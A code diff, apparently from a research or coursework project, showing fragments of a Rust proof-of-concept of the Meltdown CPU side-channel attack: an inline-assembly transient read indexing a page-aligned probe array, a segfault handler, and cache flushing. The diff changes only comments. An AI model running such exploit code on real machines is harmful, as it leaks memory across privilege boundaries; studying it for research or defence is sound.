@@ -38,7 +38,7 @@ pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
         asm!(
             "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
             "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
-            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value
+            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value, TODO check in gdb if this is compiled to movq as in the original
             x = in(reg) pointer,
             base = in(reg) &mem[0] as *const MemoryPage,
             tmp = out(reg) _,
@@ -219,7 +219,7 @@ pub fn main() {
     println!("Meltdown start\n");
     println!("Address of handle_signal is {:x}", handle_signal as u64);
     syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
-    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
+    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K TODO: Original uses 300 non-aligned entries, skips the first 2 for alignment
     const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
 		measurements: 3,
@@ -247,7 +247,7 @@ pub fn main() {
     
     for i in 0..ARRAY_SIZE {
 		let cur_ptr = &mem[i] as *const MemoryPage;
-		// Construct the correct value: 16 bytes each containing i
+		// Construct the correct value: 16 bytes each containing the value of i
 		let mut correct_value = i as u128;
 		for j in 1..16 {
 			correct_value += (i as u128) << j * 8;
@@ -255,11 +255,11 @@ pub fn main() {
 		
 		assert_eq!((cur_ptr as usize) % 4096, 0); // Check whether all elements are 4K aligned
 		for val in mem[i].0.iter() {
-			assert_eq!(*val, correct_value); // Check whether all elements are initialised with i
+			assert_eq!(*val, correct_value); // Check whether all elements are initialised with the value of i
 		}
 	}
 	
-	// cache line granularity is probably 64 bytes, therefore we step by 64 to flush the entire memory
+	// Cache line granularity is probably 64 bytes, therefore we step by 64 to flush the entire memory. Stepping by 4K is probably also enough, as we only access the first byte of each page.
 	for i in (0..total_memory).step_by(64) {
 		unsafe {
 			flush(ptr.add(i) as *const MemoryPage);
